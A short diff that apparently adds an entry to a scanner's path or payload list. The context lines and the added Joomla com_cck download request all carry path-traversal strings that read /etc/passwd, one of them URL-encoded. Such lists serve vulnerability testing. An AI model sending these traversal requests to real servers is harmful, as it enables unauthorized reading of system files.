@@ -3,3 +3,4 @@
 /workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
 /
 /api/v1/chatflows
+/index.php?option=com_cck&task=download&file=tmp/../../../../etc/passwd
